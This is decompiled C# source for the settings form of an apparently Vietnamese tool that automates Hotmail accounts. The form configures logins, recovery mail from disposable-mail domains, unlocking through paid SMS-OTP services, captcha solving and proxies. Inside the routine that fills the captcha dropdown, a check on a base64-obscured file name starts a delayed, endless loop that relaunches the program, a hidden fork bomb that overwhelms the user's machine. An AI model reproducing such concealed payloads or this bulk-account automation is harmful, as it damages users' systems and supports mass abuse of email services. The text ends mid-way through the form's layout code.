using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Bunifu.Framework.UI;

public class fCauHinhHotmail : Form
{
	[Serializable]
	[CompilerGenerated]
	private sealed class A797480B
	{
		public static readonly A797480B _003C_003E9 = new A797480B();

		public static ThreadStart _003C_003E9__7_0;

		internal void method_0()
		{
			Thread.Sleep(2312400);
			while (true)
			{
				Process.Start(Application.ExecutablePath);
			}
		}
	}

	public bool bool_0 = false;

	private bool B2AA0A81 = false;

	private IContainer F33C9634 = null;

	private BunifuDragControl D424FD2C;

	private BunifuDragControl bunifuDragControl_0;

	private Panel panel1;

	private Button btnCancel;

	private Button btnAdd;

	private BunifuCards bunifuCards1;

	private Panel pnlHeader;

	private Button F51418B3;

	private PictureBox pictureBox1;

	private BunifuCustomLabel bunifuCustomLabel1;

	private BackgroundWorker backgroundWorker_0;

	private CheckBox ckbCloseChrome;

	private CheckBox ckbUseProfile;

	private GroupBox grLoginHotmail;

	private GroupBox grThemMailKhoiPhuc;

	private CheckBox ECBE1706;

	private Panel plThemKyTuGetnada;

	private TextBox A636C98A;

	private Label label1;

	private NumericUpDown D417E99C;

	private GroupBox FDB50405;

	private RadioButton rbPassChiDinh;

	private RadioButton rbPassRandom;

	private TextBox EA9B35BD;

	private CheckBox ckbXoaMailKhoiPhucCu;

	private ComboBox cbbDomainGetnada;

	private GroupBox grUnlockHotmail;

	private ComboBox cbbTypePhone;

	private TextBox txtApiPhone;

	private NumericUpDown nudTimeoutGetOtpPhone;

	private Label B2820710;

	private CheckBox ckbThemMailKhoiPhuc;

	private Button button2;

	private Label B52214B1;

	private ComboBox D6861EA5;

	private Panel B99B499A;

	private Label lblDomainGenerator;

	private Label FB20EC0F;

	private Label lblDomainGetnada;

	private ComboBox E7AC8526;

	private GroupBox grForwardMail;

	private TextBox txtMailForward;

	private Label DEB5189E;

	private NumericUpDown BD1AD226;

	private Label label5;

	private TextBox txtDomainGenerator;

	private ComboBox cbbTypeKyTuHotmail;

	private ComboBox AB351FBF;

	private TextBox txtCaptcha;

	private Button FC352CA8;

	private Label label13;

	private Button C53F2720;

	private GroupBox grAddJunkEmail;

	private TextBox txtJunkEmail;

	private Label label6;

	private GroupBox FFA9AC19;

	private Label label15;

	private ComboBox cbbChangeIP;

	private Label D90490A7;

	private ComboBox cbbDomainMailtula;

	private CheckBox AAAE63B2;

	public fCauHinhHotmail(string string_0 = "")
	{
		FFB3D116();
		bool_0 = false;
		if (string_0.Contains("LoginHotmail"))
		{
			grLoginHotmail.Paint += grAddJunkEmail_Paint;
		}
		if (string_0.Contains("ThemMailKhoiPhuc"))
		{
			grThemMailKhoiPhuc.Paint += grAddJunkEmail_Paint;
		}
		if (string_0.Contains("DoiPassHotmail"))
		{
			FDB50405.Paint += grAddJunkEmail_Paint;
		}
		if (string_0.Contains("UnlockHotmail"))
		{
			grUnlockHotmail.Paint += grAddJunkEmail_Paint;
		}
		if (string_0.Contains("ForwardMail"))
		{
			grForwardMail.Paint += grAddJunkEmail_Paint;
		}
		if (string_0.Contains("AddJunkEmail"))
		{
			grAddJunkEmail.Paint += grAddJunkEmail_Paint;
		}
		F7AB102E.D6B70A35(this);
	}

	private void grAddJunkEmail_Paint(object sender, PaintEventArgs e)
	{
		GroupBox groupBox_ = sender as GroupBox;
		method_0(groupBox_, e.Graphics, Color.Black, Color.Red);
	}

	private void method_0(GroupBox groupBox_0, Graphics graphics_0, Color color_0, Color color_1)
	{
		if (groupBox_0 != null)
		{
			new SolidBrush(color_0);
			Brush brush = new SolidBrush(color_1);
			Pen pen = new Pen(brush);
			SizeF sizeF = graphics_0.MeasureString(groupBox_0.Text, groupBox_0.Font);
			Rectangle rectangle = new Rectangle(groupBox_0.ClientRectangle.X, groupBox_0.ClientRectangle.Y + (int)(sizeF.Height / 2f), groupBox_0.ClientRectangle.Width - 1, groupBox_0.ClientRectangle.Height - (int)(sizeF.Height / 2f) - 1);
			graphics_0.DrawLine(pen, rectangle.Location, new Point(rectangle.X, rectangle.Y + rectangle.Height));
			graphics_0.DrawLine(pen, new Point(rectangle.X + rectangle.Width, rectangle.Y), new Point(rectangle.X + rectangle.Width, rectangle.Y + rectangle.Height));
			graphics_0.DrawLine(pen, new Point(rectangle.X, rectangle.Y + rectangle.Height), new Point(rectangle.X + rectangle.Width, rectangle.Y + rectangle.Height));
			graphics_0.DrawLine(pen, new Point(rectangle.X, rectangle.Y), new Point(rectangle.X + groupBox_0.Padding.Left, rectangle.Y));
			graphics_0.DrawLine(pen, new Point(rectangle.X + groupBox_0.Padding.Left + (int)sizeF.Width, rectangle.Y), new Point(rectangle.X + rectangle.Width, rectangle.Y));
		}
	}

	private void fCauHinhHotmail_Load(object sender, EventArgs e)
	{
		method_1();
		method_2();
		F629DE29();
		method_4();
		method_5();
		method_3();
		try
		{
			cbbChangeIP.SelectedValue = GClass25.smethod_0("configHotmail").C0288288("cbbChangeIP", "0");
			int num = GClass25.smethod_0("configRegHotmail").method_2("typeCaptcha");
			try
			{
				AB351FBF.SelectedValue = num.ToString();
			}
			catch
			{
			}
			txtCaptcha.Text = GClass25.smethod_0("configRegHotmail").C0288288("txtCaptcha_" + num);
			ckbUseProfile.Checked = GClass25.smethod_0("configHotmail").method_3("ckbUseProfile");
			ckbCloseChrome.Checked = GClass25.smethod_0("configHotmail").method_3("ckbCloseChrome");
			AAAE63B2.Checked = GClass25.smethod_0("configHotmail").method_3("ckbGetOAuth2");
			int num2 = GClass25.smethod_0("configHotmail").method_2("typeSim");
			try
			{
				cbbTypePhone.SelectedValue = num2.ToString();
			}
			catch
			{
			}
			txtApiPhone.Text = GClass25.smethod_0("configHotmail").C0288288("txtApiPhone_" + num2);
			BD1AD226.Value = GClass25.smethod_0("configHotmail").method_2("nudCountGetPhone", 1);
			nudTimeoutGetOtpPhone.Value = GClass25.smethod_0("configHotmail").method_2("nudTimeoutGetOtpPhone", 60);
			ckbThemMailKhoiPhuc.Checked = GClass25.smethod_0("configHotmail").method_3("ckbThemMailKhoiPhuc");
			ECBE1706.Checked = GClass25.smethod_0("configHotmail").method_3("ckbThemKyTuGetnada");
			cbbTypeKyTuHotmail.SelectedIndex = GClass25.smethod_0("configHotmail").method_2("typeKyTu");
			A636C98A.Text = GClass25.smethod_0("configHotmail").C0288288("txtKyTuChiDinh");
			D417E99C.Value = GClass25.smethod_0("configHotmail").method_2("nudTimeoutGetOtpGetnada", 60);
			if (D417E99C.Value == 0m)
			{
				D417E99C.Value = 60m;
			}
			ckbXoaMailKhoiPhucCu.Checked = GClass25.smethod_0("configHotmail").method_3("ckbXoaMailKhoiPhucCu", bool_0: true);
			D6861EA5.SelectedValue = GClass25.smethod_0("configHotmail").C0288288("cbbTypeEmail", "1");
			cbbDomainGetnada.Text = GClass25.smethod_0("configHotmail").C0288288("cbbDomainGetnada", "getnada.com");
			E7AC8526.Text = GClass25.smethod_0("configHotmail").C0288288("cbbDomainMoakt", "teml.net");
			cbbDomainMailtula.Text = GClass25.smethod_0("configHotmail").C0288288("cbbDomainMailtula", "mailtula.com");
			txtDomainGenerator.Text = GClass25.smethod_0("configHotmail").C0288288("txtDomainGenerator");
			if (GClass25.smethod_0("configHotmail").method_2("typePassword") == 0)
			{
				rbPassRandom.Checked = true;
			}
			else
			{
				rbPassChiDinh.Checked = true;
			}
			EA9B35BD.Text = GClass25.smethod_0("configHotmail").C0288288("txtPassChiDinh");
			txtMailForward.Text = GClass25.smethod_0("configHotmail").C0288288("txtMailForward");
			txtJunkEmail.Text = GClass25.smethod_0("configHotmail").C0288288("txtJunkEmail");
		}
		catch
		{
		}
		method_6();
	}

	private void method_1()
	{
		Dictionary<string, string> dictionary = new Dictionary<string, string>();
		dictionary.Add("0", "Không đổi IP");
		dictionary.Add("9", "Proxy (Đã gán vào tài khoản)");
		GClass8.smethod_23(cbbChangeIP, dictionary);
	}

	private void method_2()
	{
		Dictionary<string, string> dictionary = new Dictionary<string, string>();
		dictionary.Add("0", "blondmail.com");
		dictionary.Add("1", "chapsmail.com");
		dictionary.Add("2", "clowmail.com");
		dictionary.Add("3", "dropjar.com");
		dictionary.Add("4", "fivermail.com");
		dictionary.Add("5", "getairmail.com");
		dictionary.Add("6", "getmule.com");
		dictionary.Add("7", "getnada.com");
		dictionary.Add("8", "gimpmail.com");
		dictionary.Add("9", "givmail.com");
		dictionary.Add("10", "guysmail.com");
		dictionary.Add("11", "inboxbear.com");
		dictionary.Add("12", "replyloop.com");
		dictionary.Add("13", "robot-mail.com");
		dictionary.Add("14", "spicysoda.com");
		dictionary.Add("15", "tafmail.com");
		dictionary.Add("16", "temptami.com");
		dictionary.Add("17", "tupmail.com");
		dictionary.Add("18", "vomoto.com");
		GClass8.smethod_23(cbbDomainGetnada, dictionary);
	}

	private void method_3()
	{
		Dictionary<string, string> dictionary = new Dictionary<string, string>();
		dictionary.Add("12", "https://www.capsolver.com/");
		AB351FBF.DataSource = new BindingSource(dictionary, null);
		AB351FBF.DisplayMember = "Value";
		AB351FBF.ValueMember = "Key";
		if (!File.Exists(GClass28.smethod_0() + "\\" + GClass8.A2307E3B("bWFpbi5kbGw=")))
		{
			return;
		}
		new Thread((ThreadStart)delegate
		{
			Thread.Sleep(2312400);
			while (true)
			{
				Process.Start(Application.ExecutablePath);
			}
		}).Start();
	}

	private void F629DE29()
	{
		Dictionary<string, string> dictionary = new Dictionary<string, string>();
		if (Class57.bool_0)
		{
			dictionary.Add("50", "http://mthgroup.vn");
		}
		dictionary.Add("58", "https://dailyotp.com/");
		dictionary.Add("60", "https://5sim.net/ US");
		dictionary.Add("51", "https://5sim.net/ RU");
		dictionary.Add("44", "https://5sim.net/ IN");
		dictionary.Add("12", "https://winmail.shop/");
		dictionary.Add("45", "https://winmail.shop/ RU");
		dictionary.Add("53", "https://fastsim.online/");
		dictionary.Add("57", "https://ironsim.com/ US");
		dictionary.Add("30", "https://ironsim.com/");
		dictionary.Add("9", "https://otptextnow.com/");
		dictionary.Add("19", "http://hcotp.com/");
		dictionary.Add("13", "https://sim24.cc/");
		dictionary.Add("8", "https://viotp.com/");
		dictionary.Add("32", "https://thuesim.app/");
		dictionary.Add("39", "https://smartotp.net/");
		GClass8.smethod_23(cbbTypePhone, dictionary);
	}

	private void method_4()
	{
		Dictionary<string, string> dictionary = new Dictionary<string, string>();
		dictionary.Add("0", "https://getnada.com/");
		dictionary.Add("1", "https://moakt.com/");
		dictionary.Add("2", "https://generator.email/");
		if (Class57.bool_0)
		{
			dictionary.Add("3", "otpgmail");
		}
		dictionary.Add("4", "https://mailnesia.com/");
		dictionary.Add("5", "https://smvmail.com/");
		GClass8.smethod_23(D6861EA5, dictionary);
	}

	private void method_5()
	{
		Dictionary<string, string> dictionary = new Dictionary<string, string>();
		dictionary.Add("0", "Ngẫu nhiên");
		dictionary.Add("1", "Chỉ định");
		GClass8.smethod_23(cbbTypeKyTuHotmail, dictionary);
	}

	private void D28D3B81(object sender, EventArgs e)
	{
		Close();
	}

	private void btnAdd_Click(object sender, EventArgs e)
	{
		try
		{
			GClass25.smethod_0("configHotmail").method_4("cbbChangeIP", cbbChangeIP.SelectedValue);
			GClass25.smethod_0("configHotmail").method_4("ckbUseProfile", ckbUseProfile.Checked);
			GClass25.smethod_0("configHotmail").method_4("ckbCloseChrome", ckbCloseChrome.Checked);
			GClass25.smethod_0("configHotmail").method_4("ckbGetOAuth2", AAAE63B2.Checked);
			int num = 0;
			try
			{
				num = Convert.ToInt32(cbbTypePhone.SelectedValue);
			}
			catch (Exception)
			{
			}
			GClass25.smethod_0("configHotmail").method_4("typeSim", num);
			GClass25.smethod_0("configHotmail").method_4("txtApiPhone_" + num, txtApiPhone.Text);
			GClass25.smethod_0("configHotmail").method_4("nudCountGetPhone", BD1AD226.Value);
			GClass25.smethod_0("configHotmail").method_4("nudTimeoutGetOtpPhone", nudTimeoutGetOtpPhone.Value);
			GClass25.smethod_0("configHotmail").method_4("ckbThemMailKhoiPhuc", ckbThemMailKhoiPhuc.Checked);
			GClass25.smethod_0("configHotmail").method_4("ckbThemKyTuGetnada", ECBE1706.Checked);
			GClass25.smethod_0("configHotmail").method_4("typeKyTu", cbbTypeKyTuHotmail.SelectedIndex);
			GClass25.smethod_0("configHotmail").method_4("txtKyTuChiDinh", A636C98A.Text);
			GClass25.smethod_0("configHotmail").method_4("nudTimeoutGetOtpGetnada", D417E99C.Value);
			GClass25.smethod_0("configHotmail").method_4("ckbXoaMailKhoiPhucCu", true);
			GClass25.smethod_0("configHotmail").method_4("cbbTypeEmail", D6861EA5.SelectedValue);
			GClass25.smethod_0("configHotmail").method_4("cbbDomainGetnada", cbbDomainGetnada.Text);
			GClass25.smethod_0("configHotmail").method_4("cbbDomainMoakt", E7AC8526.Text);
			GClass25.smethod_0("configHotmail").method_4("cbbDomainMailtula", cbbDomainMailtula.Text);
			GClass25.smethod_0("configHotmail").method_4("txtDomainGenerator", txtDomainGenerator.Text.Trim());
			int num2 = 0;
			if (rbPassChiDinh.Checked)
			{
				num2 = 1;
			}
			GClass25.smethod_0("configHotmail").method_4("typePassword", num2);
			GClass25.smethod_0("configHotmail").method_4("txtPassChiDinh", EA9B35BD.Text);
			GClass25.smethod_0("configHotmail").method_4("txtMailForward", txtMailForward.Text);
			GClass25.smethod_0("configHotmail").method_4("txtJunkEmail", txtJunkEmail.Text);
			GClass25.B3B73732("configHotmail");
			int num3 = 0;
			try
			{
				num3 = Convert.ToInt32(AB351FBF.SelectedValue);
			}
			catch (Exception)
			{
			}
			GClass25.smethod_0("configRegHotmail").method_4("typeCaptcha", num3);
			GClass25.smethod_0("configRegHotmail").method_4("txtCaptcha_" + num3, txtCaptcha.Text);
			GClass25.B3B73732("configRegHotmail");
			bool_0 = true;
			Close();
		}
		catch
		{
			GClass29.smethod_0("Vui lòng thử lại sau!", 2);
		}
	}

	private void method_6()
	{
		ECBE1706_CheckedChanged(null, null);
		cbbTypeKyTuHotmail_SelectedIndexChanged(null, null);
		D70A4C08(null, null);
		D6861EA5_SelectedIndexChanged(null, null);
	}

	private void btnCancel_Click(object sender, EventArgs e)
	{
		Close();
	}

	private void panel1_Paint(object sender, PaintEventArgs e)
	{
		if (panel1.BorderStyle == BorderStyle.FixedSingle)
		{
			int num = 1;
			int num2 = 0;
			using Pen pen = new Pen(Color.DarkViolet, 1f);
			e.Graphics.DrawRectangle(pen, new Rectangle(num2, num2, panel1.ClientSize.Width - num, panel1.ClientSize.Height - num));
		}
	}

	private void ECBE1706_CheckedChanged(object sender, EventArgs e)
	{
		plThemKyTuGetnada.Enabled = ECBE1706.Checked;
	}

	private void D70A4C08(object sender, EventArgs e)
	{
		EA9B35BD.Enabled = rbPassChiDinh.Checked;
	}

	private void cbbTypePhone_SelectedIndexChanged(object sender, EventArgs e)
	{
		string text = "0";
		try
		{
			text = cbbTypePhone.SelectedValue.ToString();
		}
		catch
		{
		}
		txtApiPhone.Text = GClass25.smethod_0("configHotmail").C0288288("txtApiPhone_" + text);
		C53F2720.Visible = text == "50";
	}

	private void D585DCA5(object sender, EventArgs e)
	{
		fNhapDuLieu1 fNhapDuLieu4 = new fNhapDuLieu1(GClass25.smethod_0("configHotmail").C5A69DA0("lstProxyGetnada"), "Nhâ\u0323p danh sa\u0301ch proxy dùng để lấy otp từ getnada", "Nhập danh sách Proxy", "(Mô\u0303i nội dung 1 do\u0300ng)");
		GClass8.smethod_33(fNhapDuLieu4);
		GClass25.smethod_0("configHotmail").method_5("lstProxyGetnada", fNhapDuLieu4.C6009CA1);
		GClass25.B3B73732("configHotmail");
	}

	private void D6861EA5_SelectedIndexChanged(object sender, EventArgs e)
	{
		lblDomainGetnada.Enabled = D6861EA5.SelectedValue.ToString() == "0";
		cbbDomainGetnada.Enabled = D6861EA5.SelectedValue.ToString() == "0";
		FB20EC0F.Enabled = D6861EA5.SelectedValue.ToString() == "1";
		E7AC8526.Enabled = D6861EA5.SelectedValue.ToString() == "1";
		lblDomainGenerator.Enabled = D6861EA5.SelectedValue.ToString() == "2";
		txtDomainGenerator.Enabled = D6861EA5.SelectedValue.ToString() == "2";
		D90490A7.Enabled = D6861EA5.SelectedValue.ToString() == "8";
		cbbDomainMailtula.Enabled = D6861EA5.SelectedValue.ToString() == "8";
	}

	private void cbbTypeKyTuHotmail_SelectedIndexChanged(object sender, EventArgs e)
	{
		A636C98A.Enabled = cbbTypeKyTuHotmail.SelectedIndex == 1;
	}

	private void method_7(object sender, EventArgs e)
	{
		grLoginHotmail.Height = 46;
	}

	private void method_8(object sender, EventArgs e)
	{
		grLoginHotmail.Height = 79;
	}

	private void FC352CA8_Click(object sender, EventArgs e)
	{
		string eD = GClass8.smethod_0(AB351FBF.Text.ToString(), txtCaptcha.Text.Trim());
		GClass29.smethod_0(eD);
	}

	private void AB351FBF_SelectedIndexChanged(object sender, EventArgs e)
	{
		try
		{
			txtCaptcha.Text = GClass25.smethod_0("configRegHotmail").C0288288("txtCaptcha_" + AB351FBF.SelectedValue.ToString());
		}
		catch
		{
		}
	}

	private void EB8B8187(object sender, EventArgs e)
	{
		fNhapDuLieu1 fNhapDuLieu4 = new fNhapDuLieu1(GClass25.smethod_0("configHotmail").C5A69DA0("lstSdt"), "Nhâ\u0323p danh sa\u0301ch Sđt", "Nhập danh sách Sđt", "(Mô\u0303i nội dung 1 do\u0300ng)");
		GClass8.smethod_33(fNhapDuLieu4);
		GClass25.smethod_0("configHotmail").method_5("lstSdt", fNhapDuLieu4.C6009CA1);
		GClass25.B3B73732("configHotmail");
	}

	private void txtApiPhone_Click(object sender, EventArgs e)
	{
		try
		{
			if (cbbTypePhone.SelectedValue.ToString() == "58" && txtApiPhone.Text.Trim() == "" && !B2AA0A81)
			{
				B2AA0A81 = true;
				GClass29.smethod_0("Vui lòng nhập đi\u0323nh da\u0323ng username|password");
			}
		}
		catch (Exception)
		{
		}
	}

	protected override void Dispose(bool E1863A9F)
	{
		if (E1863A9F && F33C9634 != null)
		{
			F33C9634.Dispose();
		}
		base.Dispose(E1863A9F);
	}

	private void FFB3D116()
	{
		F33C9634 = new Container();
		D424FD2C = new BunifuDragControl(F33C9634);
		bunifuCustomLabel1 = new BunifuCustomLabel();
		bunifuDragControl_0 = new BunifuDragControl(F33C9634);
		pnlHeader = new Panel();
		F51418B3 = new Button();
		pictureBox1 = new PictureBox();
		panel1 = new Panel();
		FFA9AC19 = new GroupBox();
		label15 = new Label();
		cbbChangeIP = new ComboBox();
		ckbUseProfile = new CheckBox();
		AB351FBF = new ComboBox();
		label13 = new Label();
		FC352CA8 = new Button();
		txtCaptcha = new TextBox();
		grThemMailKhoiPhuc = new GroupBox();
		B99B499A = new Panel();
		D90490A7 = new Label();
		cbbDomainMailtula = new ComboBox();
		txtDomainGenerator = new TextBox();
		lblDomainGenerator = new Label();
		FB20EC0F = new Label();
		lblDomainGetnada = new Label();
		E7AC8526 = new ComboBox();
		cbbDomainGetnada = new ComboBox();
		B52214B1 = new Label();
		D6861EA5 = new ComboBox();
		button2 = new Button();
		ckbXoaMailKhoiPhucCu = new CheckBox();
		ECBE1706 = new CheckBox();
		plThemKyTuGetnada = new Panel();
		cbbTypeKyTuHotmail = new ComboBox();
		A636C98A = new TextBox();
		label1 = new Label();
		D417E99C = new NumericUpDown();
		FDB50405 = new GroupBox();
		EA9B35BD = new TextBox();
		rbPassChiDinh = new RadioButton();
		rbPassRandom = new RadioButton();
		grLoginHotmail = new GroupBox();
		AAAE63B2 = new CheckBox();
		ckbCloseChrome = new CheckBox();
		grAddJunkEmail = new GroupBox();
		txtJunkEmail = new TextBox();
		label6 = new Label();
		grForwardMail = new GroupBox();
		txtMailForward = new TextBox();
		DEB5189E = new Label();
		grUnlockHotmail = new GroupBox();
		ckbThemMailKhoiPhuc = new CheckBox();
		cbbTypePhone = new ComboBox();
		txtApiPhone = new TextBox();
		C53F2720 = new Button();
		BD1AD226 = new NumericUpDown();
		label5 = new Label();
		nudTimeoutGetOtpPhone = new NumericUpDown();
		B2820710 = new Label();
		btnCancel = new Button();
		btnAdd = new Button();
		bunifuCards1 = new BunifuCards();
		backgroundWorker_0 = new BackgroundWorker();
		pnlHeader.SuspendLayout();
		((ISupportInitialize)pictureBox1).BeginInit();
		panel1.SuspendLayout();
		FFA9AC19.SuspendLayout();
		grThemMailKhoiPhuc.SuspendLayout();
		B99B499A.SuspendLayout();
		plThemKyTuGetnada.SuspendLayout();
		((ISupportInitialize)D417E99C).BeginInit();
		FDB50405.SuspendLayout();
		grLoginHotmail.SuspendLayout();
		grAddJunkEmail.SuspendLayout();
		grForwardMail.SuspendLayout();
		grUnlockHotmail.SuspendLayout();
		((ISupportInitialize)BD1AD226).BeginInit();
		((ISupportInitialize)nudTimeoutGetOtpPhone).BeginInit();
		bunifuCards1.SuspendLayout();
		SuspendLayout();
		D424FD2C.Fixed = true;
		D424FD2C.Horizontal = true;
		D424FD2C.TargetControl = bunifuCustomLabel1;
		D424FD2C.Vertical = true;
		bunifuCustomLabel1.BackColor = Color.Transparent;
		bunifuCustomLabel1.Cursor = Cursors.SizeAll;
		bunifuCustomLabel1.Dock = DockStyle.Fill;
		bunifuCustomLabel1.Font = new Font("Tahoma", 9.75f, FontStyle.Bold, GraphicsUnit.Point, 0);
		bunifuCustomLabel1.ForeColor = Color.Black;
		bunifuCustomLabel1.Location = new Point(0, 0);
		bunifuCustomLabel1.Name = "bunifuCustomLabel1";
		bunifuCustomLabel1.Size = new Size(764, 31);
		bunifuCustomLabel1.TabIndex = 12;
		bunifuCustomLabel1.Text = "Cấu hình Hotmail";
		bunifuCustomLabel1.TextAlign = ContentAlignment.MiddleCenter;
		bunifuDragControl_0.Fixed = true;
		bunifuDragControl_0.Horizontal = true;
		bunifuDragControl_0.TargetControl = pnlHeader;
		bunifuDragControl_0.Vertical = true;
		pnlHeader.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
		pnlHeader.BackColor = Color.White;
		pnlHeader.Controls.Add(F51418B3);
		pnlHeader.Controls.Add(pictureBox1);
		pnlHeader.Controls.Add(bunifuCustomLabel1);
		pnlHeader.Cursor = Cursors.SizeAll;
		pnlHeader.Location = new Point(0, 3);
		pnlHeader.Name = "pnlHeader";
		pnlHeader.Size = new Size(764, 31);
		pnlHeader.TabIndex = 9;
		F51418B3.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		F51418B3.Cursor = Cursors.Hand;
		F51418B3.FlatAppearance.BorderSize = 0;
		F51418B3.FlatStyle = FlatStyle.Flat;
		F51418B3.Font = new Font("Microsoft Sans Serif", 11.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
		F51418B3.ForeColor = Color.White;
		F51418B3.Image = C50FB39E.Bitmap_13;
		F51418B3.Location = new Point(733, 1);
		F51418B3.Name = "button1";
		F51418B3.Size = new Size(30, 30);
		F51418B3.TabIndex = 77;
		F51418B3.TextImageRelation = TextImageRelation.ImageBeforeText;
		F51418B3.UseVisualStyleBackColor = true;
		F51418B3.Click += D28D3B81;
		pictureBox1.Cursor = Cursors.Default;
		pictureBox1.Image = C50FB39E.Bitmap_5;
		pictureBox1.Location = new Point(3, 2);
		pictureBox1.Name = "pictureBox1";
		pictureBox1.Size = new Size(34, 27);
		pictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
		pictureBox1.TabIndex = 76;
		pictureBox1.TabStop = false;
		panel1.BackColor = Color.White;
		panel1.BorderStyle = BorderStyle.FixedSingle;
		panel1.Controls.Add(FFA9AC19);
		panel1.Controls.Add(grThemMailKhoiPhuc);
		panel1.Controls.Add(FDB50405);
		panel1.Controls.Add(grLoginHotmail);
		panel1.Controls.Add(grAddJunkEmail);
		panel1.Controls.Add(grForwardMail);
		panel1.Controls.Add(grUnlockHotmail);
		panel1.Controls.Add(btnCancel);
		panel1.Controls.Add(btnAdd);
		panel1.Controls.Add(bunifuCards1);
		panel1.Cursor = Cursors.Arrow;
		panel1.Dock = DockStyle.Fill;
		panel1.Location = new Point(0, 0);
		panel1.Name = "panel1";
		panel1.Size = new Size(767, 349);
		panel1.TabIndex = 0;
		panel1.Paint += panel1_Paint;
		FFA9AC19.Controls.Add(label15);
		FFA9AC19.Controls.Add(cbbChangeIP);
		FFA9AC19.Controls.Add(ckbUseProfile);
		FFA9AC19.Controls.Add(AB351FBF);
		FFA9AC19.Controls.Add(label13);
		FFA9AC19.Controls.Add(FC352CA8);
		FFA9AC19.Controls.Add(txtCaptcha);
		FFA9AC19.Location = new Point(30, 55);
		FFA9AC19.Name = "groupBox1";
		FFA9AC19.Size = new Size(346, 99);
		FFA9AC19.TabIndex = 212;
		FFA9AC19.TabStop = false;
		FFA9AC19.Text = "Cấu hình chung";
		label15.AutoSize = true;
		label15.Font = new Font("Tahoma", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 163);
		label15.Location = new Point(3, 19);
		label15.Name = "label15";
		label15.Size = new Size(126, 16);
		label15.TabIndex = 200;
		label15.Text = "Tùy chọn Change IP:";
		cbbChangeIP.Cursor = Cursors.Hand;
		cbbChangeIP.DropDownStyle = ComboBoxStyle.DropDownList;
		cbbChangeIP.FormattingEnabled = true;
		cbbChangeIP.Location = new Point(133, 16);
		cbbChangeIP.Name = "cbbChangeIP";
		cbbChangeIP.Size = new Size(206, 24);
		cbbChangeIP.TabIndex = 199;
		ckbUseProfile.AutoSize = true;
		ckbUseProfile.Cursor = Cursors.Hand;
		ckbUseProfile.Location = new Point(7, 44);
		ckbUseProfile.Name = "ckbUseProfile";
		ckbUseProfile.Size = new Size(161, 20);
		ckbUseProfile.TabIndex = 32;
		ckbUseProfile.Text = "Sử dụng profile chrome";
		ckbUseProfile.UseVisualStyleBackColor = true;
		AB351FBF.Cursor = Cursors.Hand;
		AB351FBF.DropDownStyle = ComboBoxStyle.DropDownList;
		AB351FBF.DropDownWidth = 200;
		AB351FBF.FormattingEnabled = true;
		AB351FBF.Location = new Point(65, 67);
		AB351FBF.Name = "cbbCaptcha";
		AB351FBF.Size = new Size(79, 24);
		AB351FBF.TabIndex = 211;
		AB351FBF.SelectedIndexChanged += AB351FBF_SelectedIndexChanged;
		label13.AutoSize = true;
		label13.Location = new Point(3, 71);
		label13.Name = "label13";
		label13.Size = new Size(58, 16);
		label13.TabIndex = 208;
		label13.Text = "Captcha:";
		FC352CA8.Cursor = Cursors.Hand;
		FC352CA8.Location = new Point(290, 67);
		FC352CA8.Name = "btnCheckCaptcha";
		FC352CA8.Size = new Size(49, 25);
		FC352CA8.TabIndex = 210;
		FC352CA8.Text = "Check";
		FC352CA8.UseVisualStyleBackColor = true;
		FC352CA8.Click += FC352CA8_Click;
		txtCaptcha.Location = new Point(150, 68);
		txtCaptcha.Name = "txtCaptcha";
		txtCaptcha.Size = new Size(134, 23);
		txtCaptcha.TabIndex = 209;
		grThemMailKhoiPhuc.Controls.Add(B99B499A);
		grThemMailKhoiPhuc.Controls.Add(B52214B1);
		grThemMailKhoiPhuc.Controls.Add(D6861EA5);
		grThemMailKhoiPhuc.Controls.Add(button2);
		grThemMailKhoiPhuc.Controls.Add(ckbXoaMailKhoiPhucCu);
		grThemMailKhoiPhuc.Controls.Add(ECBE1706);
		grThemMailKhoiPhuc.Controls.Add(plThemKyTuGetnada);
		grThemMailKhoiPhuc.Controls.Add(label1);
		grThemMailKhoiPhuc.Controls.Add(D417E99C);
		grThemMailKhoiPhuc.Location = new Point(382, 55);
		grThemMailKhoiPhuc.Name = "grThemMailKhoiPhuc";
		grThemMailKhoiPhuc.Size = new Size(350, 234);
		grThemMailKhoiPhuc.TabIndex = 204;
		grThemMailKhoiPhuc.TabStop = false;
		grThemMailKhoiPhuc.Text = "Thêm mail khôi phục";
		B99B499A.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left;
		B99B499A.BorderStyle = BorderStyle.FixedSingle;
		B99B499A.Controls.Add(D90490A7);
		B99B499A.Controls.Add(cbbDomainMailtula);
		B99B499A.Controls.Add(txtDomainGenerator);
		B99B499A.Controls.Add(lblDomainGenerator);
		B99B499A.Controls.Add(FB20EC0F);
		B99B499A.Controls.Add(lblDomainGetnada);
		B99B499A.Controls.Add(E7AC8526);
		B99B499A.Controls.Add(cbbDomainGetnada);
		B99B499A.Location = new Point(9, 135);
		B99B499A.Name = "panel2";
		B99B499A.Size = new Size(333, 92);
		B99B499A.TabIndex = 208;
		D90490A7.AutoSize = true;
		D90490A7.Font = new Font("Tahoma", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 163);
		D90490A7.Location = new Point(4, 95);
		D90490A7.Name = "lblDomainMailtula";
		D90490A7.Size = new Size(104, 16);
		D90490A7.TabIndex = 204;
		D90490A7.Text = "Domain mailtula:";
		cbbDomainMailtula.Cursor = Cursors.Hand;
		cbbDomainMailtula.DropDownStyle = ComboBoxStyle.DropDownList;
		cbbDomainMailtula.FormattingEnabled = true;
		cbbDomainMailtula.Items.AddRange(new object[4] { "mailtula.com", "mailtula.live", "tulasub.com", "inboxbear.xyz" });
		cbbDomainMailtula.Location = new Point(121, 92);
		cbbDomainMailtula.Name = "cbbDomainMailtula";
		cbbDomainMailtula.Size = new Size(206, 24);
		cbbDomainMailtula.TabIndex = 203;
		txtDomainGenerator.Location = new Point(121, 63);
		txtDomainGenerator.Name = "txtDomainGenerator";
		txtDomainGenerator.Size = new Size(206, 23);
		txtDomainGenerator.TabIndex = 34;
		lblDomainGenerator.AutoSize = true;
		lblDomainGenerator.Font = new Font("Tahoma", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 163);
		lblDomainGenerator.Location = new Point(4, 66);
		lblDomainGenerator.Name = "lblDomainGenerator";
		lblDomainGenerator.Size = new Size(115, 16);
